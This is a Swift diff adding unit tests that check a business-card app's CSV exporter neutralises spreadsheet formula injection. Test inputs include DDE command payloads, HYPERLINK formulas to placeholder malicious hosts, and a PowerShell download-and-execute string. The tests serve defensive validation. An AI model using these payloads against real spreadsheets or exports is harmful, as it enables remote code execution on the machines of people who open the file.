@@ -257,6 +257,181 @@ final class ExportTests: XCTestCase {
         XCTAssertTrue(preview.contains("5 more contacts"))
     }
 
+    // MARK: - CSV Formula Injection Security Tests
+
+    func testCSVFormulaInjectionEquals() {
+        // Test Excel formula starting with =
+        let card = BusinessCard(
+            fullName: "=1+1",
+            company: "=cmd|'/c calc'!A1",
+            rawText: "Test"
+        )
+
+        let csv = CSVExporter.exportCard(card, fields: [.fullName, .company])
+
+        // Formula should be neutralized with single quote
+        XCTAssertTrue(csv.contains("'=1+1"), "Equals formula not sanitized")
+        XCTAssertTrue(csv.contains("'=cmd|'/c calc'!A1"), "Command injection not sanitized")
+    }
+
+    func testCSVFormulaInjectionPlus() {
+        // Test formula starting with +
+        let card = BusinessCard(
+            fullName: "+1+1",
+            company: "+cmd|'/c notepad'!A1",
+            rawText: "Test"
+        )
+
+        let csv = CSVExporter.exportCard(card, fields: [.fullName, .company])
+
+        XCTAssertTrue(csv.contains("'+1+1"), "Plus formula not sanitized")
+        XCTAssertTrue(csv.contains("'+cmd|'/c notepad'!A1"), "Plus command injection not sanitized")
+    }
+
+    func testCSVFormulaInjectionMinus() {
+        // Test formula starting with -
+        let card = BusinessCard(
+            fullName: "-1+1",
+            company: "-2+5",
+            rawText: "Test"
+        )
+
+        let csv = CSVExporter.exportCard(card, fields: [.fullName, .company])
+
+        XCTAssertTrue(csv.contains("'-1+1"), "Minus formula not sanitized")
+        XCTAssertTrue(csv.contains("'-2+5"), "Minus formula not sanitized")
+    }
+
+    func testCSVFormulaInjectionAt() {
+        // Test formula starting with @ (used in Excel functions)
+        let card = BusinessCard(
+            fullName: "@SUM(A1:A10)",
+            company: "@COMMAND",
+            rawText: "Test"
+        )
+
+        let csv = CSVExporter.exportCard(card, fields: [.fullName, .company])
+
+        XCTAssertTrue(csv.contains("'@SUM(A1:A10)"), "At formula not sanitized")
+        XCTAssertTrue(csv.contains("'@COMMAND"), "At command not sanitized")
+    }
+
+    func testCSVFormulaInjectionTab() {
+        // Test formula starting with tab character
+        let card = BusinessCard(
+            fullName: "\t=1+1",
+            company: "\tmalicious",
+            rawText: "Test"
+        )
+
+        let csv = CSVExporter.exportCard(card, fields: [.fullName, .company])
+
+        // Tab should be sanitized
+        XCTAssertTrue(csv.contains("'\t=1+1"), "Tab prefix not sanitized")
+        XCTAssertTrue(csv.contains("'\tmalicious"), "Tab prefix not sanitized")
+    }
+
+    func testCSVFormulaInjectionCarriageReturn() {
+        // Test formula starting with carriage return
+        let card = BusinessCard(
+            fullName: "\r=1+1",
+            rawText: "Test"
+        )
+
+        let csv = CSVExporter.exportCard(card, fields: [.fullName])
+
+        // Carriage return prefix should be sanitized
+        XCTAssertTrue(csv.contains("'\r=1+1"), "Carriage return prefix not sanitized")
+    }
+
+    func testCSVFormulaInjectionNormalText() {
+        // Test that normal text is NOT modified
+        let card = BusinessCard(
+            fullName: "John Doe",
+            company: "Tech Corp",
+            email: "john@example.com",
+            phoneNumber: "+1-555-1234",
+            rawText: "Test"
+        )
+
+        let csv = CSVExporter.exportCard(card, fields: [.fullName, .company, .email, .phoneNumber])
+
+        // Normal text should remain unchanged (no quotes unless needed for CSV structure)
+        XCTAssertFalse(csv.contains("'John Doe"), "Normal text incorrectly sanitized")
+        XCTAssertFalse(csv.contains("'Tech Corp"), "Normal text incorrectly sanitized")
+        XCTAssertFalse(csv.contains("'john@example.com"), "Normal text incorrectly sanitized")
+
+        // Phone number starting with + is LEGITIMATE, should be sanitized
+        XCTAssertTrue(csv.contains("'+1-555-1234"), "Phone number with + should be sanitized")
+    }
+
+    func testCSVFormulaInjectionEmptyValues() {
+        // Test that empty values don't cause issues
+        let card = BusinessCard(
+            fullName: "John Doe",
+            company: "",
+            email: nil,
+            rawText: "Test"
+        )
+
+        let csv = CSVExporter.exportCard(card, fields: [.fullName, .company, .email])
+
+        // Should handle empty values without crashing
+        XCTAssertTrue(csv.contains("John Doe"))
+    }
+
+    func testCSVFormulaInjectionWithCSVEscaping() {
+        // Test formula injection combined with CSV structural characters
+        let card = BusinessCard(
+            fullName: "=1+1, Inc",
+            company: "+cmd|'test', data",
+            notes: "=HYPERLINK(\\"http://evil.com\\", \\"click\\")",
+            rawText: "Test"
+        )
+
+        let csv = CSVExporter.exportCard(card, fields: [.fullName, .company, .notes])
+
+        // Should have both formula sanitization (') AND CSV escaping (quotes)
+        XCTAssertTrue(csv.contains("\\"'=1+1, Inc\\""), "Combined sanitization failed")
+        XCTAssertTrue(csv.contains("\\"'+cmd|'test', data\\""), "Combined sanitization failed")
+        XCTAssertTrue(csv.contains("'=HYPERLINK"), "Hyperlink injection not sanitized")
+    }
+
+    func testCSVFormulaInjectionRealWorldOCR() {
+        // Test realistic malicious OCR scenarios
+        let card = BusinessCard(
+            fullName: "=HYPERLINK(\\"http://malware.com\\",\\"Click Here\\")",
+            company: "@SUM(1+1)+@SUM(1+1)",
+            email: "+1234|'/c calc'!A0",
+            notes: "=cmd|'/c powershell IEX(wget malicious.com/shell.ps1)'!A1",
+            rawText: "Test"
+        )
+
+        let csv = CSVExporter.exportCard(card, fields: [.fullName, .company, .email, .notes])
+
+        // All malicious formulas should be neutralized
+        XCTAssertTrue(csv.contains("'=HYPERLINK"), "HYPERLINK attack not sanitized")
+        XCTAssertTrue(csv.contains("'@SUM"), "SUM formula not sanitized")
+        XCTAssertTrue(csv.contains("'+1234|"), "Pipe command not sanitized")
+        XCTAssertTrue(csv.contains("'=cmd|"), "PowerShell injection not sanitized")
+    }
+
+    func testCSVFormulaInjectionMultipleCards() {
+        // Test that sanitization works across multiple cards
+        let cards = [
+            BusinessCard(fullName: "=malicious1", rawText: "Test"),
+            BusinessCard(fullName: "Normal Name", rawText: "Test"),
+            BusinessCard(fullName: "+malicious2", rawText: "Test")
+        ]
+
+        let csv = CSVExporter.exportCards(cards, fields: [.fullName])
+
+        // Should sanitize all malicious entries
+        XCTAssertTrue(csv.contains("'=malicious1"), "Multi-card sanitization failed")
+        XCTAssertFalse(csv.contains("'Normal Name"), "Normal name incorrectly sanitized")
+        XCTAssertTrue(csv.contains("'+malicious2"), "Multi-card sanitization failed")
+    }
+
     // MARK: - Export Format Tests
 
     func testExportFormatProperties() {
